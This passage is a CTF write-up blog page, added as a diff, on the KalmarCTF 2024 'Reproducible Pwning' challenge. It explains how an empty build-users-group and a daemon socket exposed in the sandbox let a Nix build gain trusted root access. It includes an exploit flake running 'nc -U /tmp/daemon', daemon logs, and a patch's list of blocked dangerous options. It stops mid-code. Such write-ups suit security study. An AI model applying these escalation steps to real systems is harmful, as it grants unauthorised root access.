@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<meta charset="utf-8" />
+<meta http-equiv="x-ua-compatible" content="ie=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="base" content="https://parnianlali.github.io" />
+<meta name="HandheldFriendly" content="True" />
+<meta name="mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="default" />
+
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500|Nunito&amp;display=swap" rel="stylesheet" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://parnianlali.github.io/common.css?h=5973d4556e23e9912129" />
+<link rel="stylesheet" href="https://parnianlali.github.io/blog.css?h=e3b0c44298fc1c149afb" /><meta name="robots" content="index, follow" />
+  <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <link rel="icon" href="https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;icooo.54ae9a801d66ff54.png" type="image/png">
+  <title>KalmarCTF 2024 Write-up: Reproducible Pwning | Parnian Lali</title>
+  <meta property="og:title" content="KalmarCTF 2024 Write-up: Reproducible Pwning" />
+  <meta name="twitter:title" content="KalmarCTF 2024 Write-up: Reproducible Pwning" />
+  <meta name="copyright" content="Parnian Lali" />
+  <meta name="description" content="This is a write-up of the “Reproducible Pwning” challenge from KalmarCTF 2024.
+This challenge takes us through the inner workings of Nix and a very interesting
+privilege escalation that has made me change my own NixOS configuration." />
+  <meta property="og:description" content="This is a write-up of the “Reproducible Pwning” challenge from KalmarCTF 2024.
+This challenge takes us through the inner workings of Nix and a very interesting
+privilege escalation that has made me change my own NixOS configuration." />
+  <meta name="twitter:description" content="This is a write-up of the “Reproducible Pwning” challenge from KalmarCTF 2024.
+This challenge takes us through the inner workings of Nix and a very interesting
+privilege escalation that has made me change my own NixOS configuration." />
+  <link rel="canonical" href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/" />
+  <meta property="og:url" content="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/" />
+  <meta name="twitter:url" content="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:site_name" content="Parnian Lali" />
+  <meta property="og:locale" content="en_US" />
+  <meta property="og:type" content="website" />
+  <meta property="og:updated_time" content="2024-03-19" /><link rel="alternate" type="application/atom+xml" title="Atom Feed" href="https://parnianlali.github.io/blog/atom.xml" /><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://parnianlali.github.io/blog/rss.xml" />
+    
+    <link rel="icon" type="image/png" href="&#x2F;assets&#x2F;images&#x2F;icooo.png">
+    
+
+  </head>
+  <body>
+    <header>
+<nav>
+  <div>
+    <button id="drawer-open" class="icon-button" aria-label="Open Navigation Drawer">
+      <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
+
+    </button>
+    <h1><a href="https://parnianlali.github.io/#top">Parnian Lali</a></h1>
+  </div>
+  <div>
+    <a class="button--big" href="https:&#x2F;&#x2F;parnianlali.github.io">
+      Home
+    </a>
+    <a class="button--big" href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">
+      CV
+    </a>
+  </div>
+</nav>
+<dialog id="navbar-drawer">
+  <button id="drawer-close" class="icon-button" aria-label="Close Navigation Drawer">
+    <svg aria-hidden="true" viewBox="0 0 24 24" focusable="false"><path d="M18.3 5.71a.9959.9959 0 0 0-1.41 0L12 10.59 7.11 5.7a.9959.9959 0 0 0-1.41 0c-.39.39-.39 1.02 0 1.41L10.59 12 5.7 16.89c-.39.39-.39 1.02 0 1.41.39.39 1.02.39 1.41 0L12 13.41l4.89 4.89c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L13.41 12l4.89-4.89c.38-.38.38-1.02 0-1.4z"></path></svg>
+
+  </button>
+  <div class="navbar-drawer-links">
+    <a class="button--big" href="https:&#x2F;&#x2F;parnianlali.github.io">
+      Home
+    </a>
+    <a class="button--big" href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">
+      CV
+    </a>
+  </div>
+</dialog>
+<div id="navbar-trigger" style="position: absolute; width: 1px; height: 1px; top: 100px; left: 0;"></div>
+    </header>
+    <main id="top">
+
+<div class="container post">
+  <a class="back" href=https://parnianlali.github.io/blog>Back to post list</a>
+  <article>
+    <header>
+      <h1>KalmarCTF 2024 Write-up: Reproducible Pwning</h1>
+      <span>2024-03-19 &middot; 16 minute read</span>
+      <p>
+        <a href="https://parnianlali.github.io/tags/ctf/">#ctf</a>
+        <a href="https://parnianlali.github.io/tags/ctf-writeup/">#ctf-writeup</a>
+        <a href="https://parnianlali.github.io/tags/nix/">#nix</a>
+        <a href="https://parnianlali.github.io/tags/nixos/">#nixos</a>
+      </p>
+    </header>
+    <div>
+      
+      
+      <div class="table-of-contents">
+        <ul>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#the-challenge">The Challenge</a>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#investigating-attack-vectors">Investigating Attack Vectors</a>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#turning-on-the-vm">Turning on the VM</a>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#escaping-the-sandbox">Escaping the Sandbox</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#building-a-flake-inside-a-derivation">Building a Flake Inside a Derivation</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#modifying-the-nix-store">Modifying the Nix Store</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#building-a-package-inside-a-derivation">Building a Package inside a Derivation</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#intended-solution">Intended Solution</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#abusing-diff-hook">Abusing diff-hook</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#abusing-read-write-access-to-the-nix-store">Abusing Read-Write Access to the Nix Store</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-reproducible-pwning/#final-remarks">Final Remarks</a>
+                
+            </li>
+          
+        </ul>
+      </div>
+      
+      <p>This is a write-up of the “Reproducible Pwning” challenge from KalmarCTF 2024.
+This challenge takes us through the inner workings of Nix and a very interesting
+privilege escalation that has made me change my own NixOS configuration.</p>
+<span id="continue-reading"></span>
+<p>While I was already playing KalmarCTF, it was only after a <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@leftpaddotpy/112103523507978883">Mastodon post</a> that
+I noticed this Nix(OS)-related challenge, so thanks to <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@leftpaddotpy">jade</a> for posting this!</p>
+<h2 id="the-challenge">The Challenge</h2>
+<p>Let’s start by taking a look at the challenge.
+We were provided with 4 files, a netcat command to spawn a new NixOS VM, and the
+following description.</p>
+<blockquote>
+<p>I got access to this NixOS machine, but only as an unprivileged user.
+Can you see if you can find anything interesting?</p>
+<p>The ISO provided runs the same config as the remote except for network
+configuration and how /data is mounted. The flag is at /data/flag.</p>
+</blockquote>
+<p>The given files were a <code>flake.nix</code>, a <code>flake.lock</code>, a <code>nix.patch</code> and
+a <code>nixos.iso</code> (which was not actually a disk image; more on that later).</p>
+<p>We can start by taking a look at the <code>flake.nix</code> file, which has some interesting
+sections:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">nixpkgs</span><span>.</span><span style="color:#bb80b3;">overlays </span><span style="color:#5fb3b3;">= [
+</span><span>    </span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">final</span><span style="color:#5fb3b3;">: </span><span style="color:#f99157;">prev</span><span style="color:#5fb3b3;">: {
+</span><span>      </span><span style="color:#bb80b3;">nix </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">final</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nixVersions</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nix_2_13</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">overrideAttrs </span><span style="color:#5fb3b3;">{
+</span><mark style="background-color:#3e4044;"><span>        </span><span style="color:#bb80b3;">patches </span><span style="color:#5fb3b3;">= [</span><span style="color:#99c794;">./nix.patch</span><span style="color:#5fb3b3;">];
+</span></mark><span>        </span><span style="color:#bb80b3;">doInstallCheck </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">false</span><span style="color:#5fb3b3;">;
+</span><span>      </span><span style="color:#5fb3b3;">};
+</span><span>    </span><span style="color:#5fb3b3;">})
+</span><span>  </span><span style="color:#5fb3b3;">];
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">systemd</span><span>.</span><span style="color:#bb80b3;">services</span><span>.</span><span style="color:#bb80b3;">nix-daemon</span><span>.</span><span style="color:#bb80b3;">serviceConfig</span><span>.</span><span style="color:#bb80b3;">EnvironmentFile </span><span style="color:#5fb3b3;">= </span><span style="color:#c594c5;">let
+</span><span>    </span><span style="color:#bb80b3;">sandbox </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">writeText </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">nix-daemon-config</span><span style="color:#5fb3b3;">&quot; &#39;&#39;
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">      extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
+</span></mark><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>    </span><span style="color:#bb80b3;">buildug </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">writeText </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">nix-daemon-config</span><span style="color:#5fb3b3;">&quot; &#39;&#39;
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">      build-users-group =
+</span></mark><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#c594c5;">in
+</span><span>    </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">writeText </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">env</span><span style="color:#5fb3b3;">&quot; &#39;&#39;
+</span><span style="color:#99c794;">      NIX_USER_CONF_FILES=</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">sandbox</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">:</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">buildug</span><span style="color:#5fb3b3;">}
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">}
+</span><span style="color:#5f6364;"># ...
+</span></code></pre>
+<p>As we can see, there are two important things happening in this NixOS configuration:</p>
+<ul>
+<li>The Nix version is being overridden (through an overlay) to Nix 2.13(.6);</li>
+<li>Two extra options, <code>extra-sandbox-paths</code> and <code>build-users-group</code> are being passed
+to the <code>nix-daemon</code>. We will delve into the implications of these options later.</li>
+</ul>
+<p>To get the whole picture, let’s now take a look at the patch that is being applied
+to Nix:</p>
+<pre data-lang="patch" style="background-color:#2b2c2f;color:#cccece;" class="language-patch "><code class="language-patch" data-lang="patch"><span>diff --git a/src/libutil/config.cc b/src/libutil/config.cc
+</span><span>index 37f5b50c7..fd824ee03 100644
+</span><span style="color:#5fb3b3;">---</span><span> a/src/libutil/config.cc
+</span><span style="color:#5fb3b3;">+++</span><span> b/src/libutil/config.cc
+</span><span style="color:#5fb3b3;">@@ </span><span>-1,3 +1,4 </span><span style="color:#5fb3b3;">@@
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">#include &quot;logging.hh&quot;
+</span><span> #include &quot;config.hh&quot;
+</span><span> #include &quot;args.hh&quot;
+</span><span> #include &quot;abstract-setting-to-json.hh&quot;
+</span><span style="color:#5fb3b3;">@@ </span><span>-17,6 +18,16 </span><span style="color:#5fb3b3;">@@ </span><span>Config::Config(StringMap initials)
+</span><span> 
+</span><span> bool Config::set(const std::string &amp; name, const std::string &amp; value)
+</span><span> {
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">    if (name.find(&quot;build-hook&quot;) != std::string::npos
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">        || name == &quot;accept-flake-config&quot;
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">        || name == &quot;allow-new-privileges&quot;
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">        || name == &quot;impure-env&quot;) {
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">        logWarning({
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">            .msg = hintfmt(&quot;Option &#39;%1%&#39; is too dangerous, skipping.&quot;, name)
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">        });
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">        return true;
+</span><span style="color:#5fb3b3;">+</span><span style="color:#99c794;">    }
+</span><span style="color:#5fb3b3;">+
+</span><span>     bool append = false;
+</span><span>     auto i = _settings.find(name);
+</span><span>     if (i == _settings.end()) {
+</span></code></pre>
+<p>It seems like it is blocking a few options from being set, namely <code>build-hook</code>,
+<code>post-build-hook</code>, <code>pre-build-hook</code>, <code>accept-flake-config</code>, <code>allow-new-privileges</code>
+and <code>impure-env</code>, which gives us a hint that we might want to play around
+with options in this challenge.</p>
+<p>Finally, we take a look at the <code>nixos.iso</code> file.
+Surprisingly, the file was quite small, so it certainly couldn’t be a disk image.
+Instead, it was a Git LFS file:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>version https://git-lfs.github.com/spec/v1
+</span><span>oid sha256:766941d2f79399f3a4b7c2dcc43be98fe80f5f17fcab34c5d021f5b4f500135d
+</span><span>size 339738624
+</span></code></pre>
+<p>I spent way too long figuring out what to do with this and how to use it to download
+the ISO, only to realise I didn’t have enough information to download a file from Git LFS,
+since I was missing the repository name.
+Upon further inspection of the flake we were given, I noticed it outputs an <code>iso</code>
+package that we can build (duh).
+By running <code>nix build .#iso</code> and waiting a few minutes for Nix to compile, I got
+the ISO and unsurprisingly the hash matched what was in the Git LFS file (hurray
+for reproducibility!). Nice.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ sha256sum result/iso/nixos.iso
+</span><span>766941d2f79399f3a4b7c2dcc43be98fe80f5f17fcab34c5d021f5b4f500135d  result/iso/nixos.iso
+</span></code></pre>
+<h2 id="investigating-attack-vectors">Investigating Attack Vectors</h2>
+<p>With all the files inspected and (moderately) understood, it was time to figure out
+what to do with all the information I had.
+As a sanity check, the first thing I did was checking if the flag was somehow stored
+in the Nix store, but it was not.</p>
+<p>I then decided to take a look at the Nix 2.13.6 code, more specifically into the
+<code>nix-daemon</code> code.
+A quick clone of the repository and grepping for <code>nix-daemon</code> directed me to the
+<code>src/nix/daemon.cc</code> file, which seems to contain the logic for starting the daemon
+and listening for incoming connections on its Unix socket.
+I am not very proficient with C++, so it took me a while to figure out everything
+that was going on, but I eventually found the <code>daemonLoop</code> function that
+is responsible for accepting new connections and determining if they come from a
+trusted user or not.</p>
+<p>One part of that function that immediately stood out was this <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/blob/2.13.6/src/nix/daemon.cc#L244-L252">block of (disabled) code</a>:</p>
+<pre data-lang="cpp" style="background-color:#2b2c2f;color:#cccece;" class="language-cpp "><code class="language-cpp" data-lang="cpp"><span style="color:#c594c5;">static void </span><span style="color:#6699cc;">daemonLoop</span><span style="color:#5fb3b3;">()
+</span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span>  </span><span style="color:#6699cc;">processConnection</span><span style="color:#5fb3b3;">(</span><span style="color:#6699cc;">openUncachedStore</span><span style="color:#5fb3b3;">(),</span><span style="color:#6699cc;"> from</span><span style="color:#5fb3b3;">,</span><span style="color:#6699cc;"> to</span><span style="color:#5fb3b3;">,</span><span style="color:#6699cc;"> trusted</span><span style="color:#5fb3b3;">,</span><span style="color:#6699cc;"> NotRecursive</span><span style="color:#5fb3b3;">, [&amp;](</span><span style="color:#6699cc;">Store </span><span style="color:#5fb3b3;">&amp;</span><span style="color:#6699cc;"> store</span><span style="color:#5fb3b3;">) {
+</span><span style="color:#c594c5;">#if </span><span style="color:#f99157;">0
+</span><span style="color:#5f6364;">      /* Prevent users from doing something very dangerous. */
+</span><span style="color:#5f6364;">      if (geteuid() == 0 &amp;&amp;
+</span><span style="color:#5f6364;">          querySetting(&quot;build-users-group&quot;, &quot;&quot;) == &quot;&quot;)
+</span><span style="color:#5f6364;">          throw Error(&quot;if you run &#39;nix-daemon&#39; as root, then you MUST set &#39;build-users-group&#39;!&quot;);
+</span><span style="color:#c594c5;">#endif
+</span><span style="color:#6699cc;">      store</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">createUser</span><span style="color:#5fb3b3;">(</span><span style="color:#6699cc;">user</span><span style="color:#5fb3b3;">,</span><span style="color:#6699cc;"> peer</span><span style="color:#5fb3b3;">.</span><span>uid</span><span style="color:#5fb3b3;">);
+</span><span style="color:#6699cc;">  </span><span style="color:#5fb3b3;">});
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>It does seem like at some point this code was introduced to prevent running <code>nix-daemon</code> as root
+if <code>build-users-group</code> is empty, but it was disabled <em>16 years ago</em> because apparently it
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/commit/98968fbb63a1a049b2439bfc2a7d53e5b51471e3">breaks RPM builds</a>. 🙃
+The comment in the code clearly states this is <em>very dangerous</em> 👻, so this was definitely
+the right track.</p>
+<p>Upon opening the <code>nix.conf(5)</code> man page, we can read the description of the <code>build-users-group</code>
+option (emphasis mine):</p>
+<blockquote>
+<p>This options specifies the Unix group containing the Nix build user accounts. In multi-user
+Nix installations, builds should not be performed by the Nix account since that would allow users
+to arbitrarily modify the Nix store and database by supplying specially crafted builders; and
+they cannot be performed by the calling user since that would allow him/her to influence the build result.</p>
+<p>Therefore, if this option is non-empty and specifies a valid group, builds will be performed under
+the user accounts that are a member of the group specified here (as listed in /etc/group).
+Those user accounts should not be used for any other purpose!</p>
+<p>[…]</p>
+<p>If the build users group is empty, <strong>builds will be performed under the uid of the Nix process</strong>
+(that is, the uid of the caller if NIX_REMOTE is empty, the uid under which the Nix daemon runs
+if NIX_REMOTE is daemon).
+<strong>Obviously, this should not be used with a nix daemon accessible to untrusted clients.</strong></p>
+<p>Defaults to nixbld when running as root, empty otherwise.</p>
+</blockquote>
+<p>So it seems that since <code>build-users-group</code> is empty, builds will be performed by the root user,
+which, by default, is a trusted user in the eyes of the <code>nix-daemon</code>.</p>
+<p>Putting together all the puzzle pieces, I realise that the <code>nix-daemon</code> is exposed inside
+the build sandbox at <code>/tmp/daemon</code> because of the aforementioned <code>extra-sandbox-paths</code> option,
+which means we can get trusted access to the <code>nix-daemon</code>!</p>
+<h2 id="turning-on-the-vm">Turning on the VM</h2>
+<p>To test this theory, I tweak the <code>flake.nix</code> a bit to set a password for both the <code>root</code> and <code>user</code>
+users and enable SSH access for <code>root</code>.
+This allows me to access logs from the <code>nix-daemon</code>, which <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/blob/2.13.6/src/nix/daemon.cc#L215-L217">prints a message</a>
+every time a connection is initiated, indicating whether the user is trusted or not.</p>
+<p>Turning on the VM with QEMU and SSH’ing into both users, I upload a simple flake that contains
+a derivation that opens a connection to the <code>nix-daemon</code> socket during build.</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">description </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">Exploit for Reproducible Pwn - KalmarCTF 2024</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">inputs </span><span style="color:#5fb3b3;">= {
+</span><span>    </span><span style="color:#bb80b3;">nixpkgs</span><span>.</span><span style="color:#bb80b3;">url </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">github:nixos/nixpkgs?ref=6e2f00c83911461438301db0dba5281197fe4b3a</span><span style="color:#5fb3b3;">&quot;; </span><span style="color:#5f6364;"># nixos-unstable
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">outputs </span><span style="color:#5fb3b3;">= {
+</span><span>    </span><span style="color:#f99157;">self</span><span style="color:#5fb3b3;">,
+</span><span>    </span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">,
+</span><span>  </span><span style="color:#5fb3b3;">}: </span><span style="color:#c594c5;">let
+</span><span>    </span><span style="color:#bb80b3;">system </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">x86_64-linux</span><span style="color:#5fb3b3;">&quot;;
+</span><span>    </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#f99157;">nixpkgs </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#c594c5;">inherit </span><span style="color:#bb80b3;">system</span><span style="color:#5fb3b3;">;
+</span><span>      </span><span style="color:#bb80b3;">overlays </span><span style="color:#5fb3b3;">= [
+</span><span>        </span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">final</span><span style="color:#5fb3b3;">: </span><span style="color:#f99157;">prev</span><span style="color:#5fb3b3;">: {
+</span><span>          </span><span style="color:#bb80b3;">nix </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">final</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nixVersions</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nix_2_13</span><span style="color:#5fb3b3;">;
+</span><span>        </span><span style="color:#5fb3b3;">})
+</span><span>      </span><span style="color:#5fb3b3;">];
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#c594c5;">in </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">}</span><span>.</span><span style="color:#bb80b3;">exploit </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#bb80b3;">name </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">exploit</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>      </span><span style="color:#5f6364;"># Just run installPhase and skip everything else
+</span><span>      </span><span style="color:#bb80b3;">phases </span><span style="color:#5fb3b3;">= [&quot;</span><span style="color:#99c794;">installPhase</span><span style="color:#5fb3b3;">&quot;];
+</span><span>
+</span><span>      </span><span style="color:#bb80b3;">buildInputs </span><span style="color:#5fb3b3;">= [
+</span><span>        </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">netcat
+</span><span>      </span><span style="color:#5fb3b3;">];
+</span><span>
+</span><mark style="background-color:#3e4044;"><span>      </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span></mark><span style="color:#99c794;">        nc -U /tmp/daemon
+</span><span style="color:#99c794;">      </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>By building this package using the <code>user</code> user, with <code>nix build .#exploit</code>,
+we can see in the <code>nix-daemon</code> logs (<code>journalctl -xefu nix-daemon</code> from the <code>root</code> user)
+that the build is indeed running as the <code>root</code> user!</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>nix-daemon[1130]: accepted connection from pid 2925, user user
+</span><span>nix-daemon[1130]: accepted connection from pid 4643, user root (trusted)
+</span></code></pre>
+<h2 id="escaping-the-sandbox">Escaping the Sandbox</h2>
+<p>Now that we have validated that the build indeed runs as root and that we have
+trusted access to the <code>nix-daemon</code>, we need to find a way to escape the build
+sandbox, since the <code>/data</code> directory is not exposed inside it.</p>
+<p>My first thought was to take a look at the <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/blob/2.13.6/src/libstore/daemon.cc#L269">available operations exposed by the <code>nix-daemon</code></a>
+and figure out if I could send a specially crafted payload through the socket
+that would allow me to get the daemon to copy <code>/data/flag</code> into the (world-readable)
+Nix store. However, I was deterred by my poor understanding of C++ and by trying
+out the experiment locally on my laptop through <code>nix-store --add</code>, which promptly ruined
+those plans:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ nix-store --add /data/flag
+</span><span>error (ignored): error: end of string reached
+</span><span>error: opening file &#39;/data/flag&#39;: Permission denied
+</span></code></pre>
+<p>I briefly looked at the daemon code to understand if this was being checked on the
+<code>nix-store</code> command or on the daemon, but from my (limited) understanding of the code,
+it seems like the <code>nix-daemon</code> only receives the data to be added to the Nix store
+and not a file path, which means it is responsibility of whoever is connecting to the
+daemon to read the file.
+Bummer.</p>
+<p>Having hit a dead end, I decided to search for “privilege escalation” in the Nix
+repository’s issue tracker which yielded
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/issues/9649#issuecomment-1868001568">an interesting comment about running commands as root without password</a>.
+If you are not aware, this is the same problem as using Docker while having your user
+as a member of the <code>docker</code> group: it allows for passwordless privilege escalation
+through a daemon running at root.
+This is apparently a conscious design decision of both Docker and Nix, and is clearly
+pointed out in their respective documentation.
+Unfortunately for us, the given example in the issue is using <code>post-build-hook</code>,
+which is disabled in the challenge due to the patch that has been applied to Nix.</p>
+<p>However, the idea remains, and two possible paths forward pop in my head:</p>
+<ul>
+<li>Since it is possible to control the options passed to <code>nix build</code>,
+could we take advantage of our trusted user privileges to build a
+new derivation that would escape the sandbox?
+Is it even possible to build a derivation inside another derivation?</li>
+<li>The aforementioned issue also mentions that, once you are a trusted user,
+you are able to “access or replace store path contents that are critical for
+system security”, which gave me the idea of trying to change the <code>nix-daemon</code>
+configuration to include <code>/data</code> in the sandbox.</li>
+</ul>
+<h3 id="building-a-flake-inside-a-derivation">Building a Flake Inside a Derivation</h3>
+<p>With both of these ideas in mind, I started with the first one and built
+a small flake:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">inputs </span><span style="color:#5fb3b3;">= {
+</span><span>    </span><span style="color:#bb80b3;">nixpkgs</span><span>.</span><span style="color:#bb80b3;">url </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">github:nixos/nixpkgs?ref=6e2f00c83911461438301db0dba5281197fe4b3a</span><span style="color:#5fb3b3;">&quot;; </span><span style="color:#5f6364;"># nixos-unstable
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">outputs </span><span style="color:#5fb3b3;">= {
+</span><span>    </span><span style="color:#f99157;">self</span><span style="color:#5fb3b3;">,
+</span><span>    </span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">,
+</span><span>  </span><span style="color:#5fb3b3;">}: </span><span style="color:#c594c5;">let
+</span><span>    </span><span style="color:#bb80b3;">system </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">x86_64-linux</span><span style="color:#5fb3b3;">&quot;;
+</span><span>    </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#f99157;">nixpkgs </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#c594c5;">inherit </span><span style="color:#bb80b3;">system</span><span style="color:#5fb3b3;">;
+</span><span>    </span><span style="color:#5fb3b3;">};
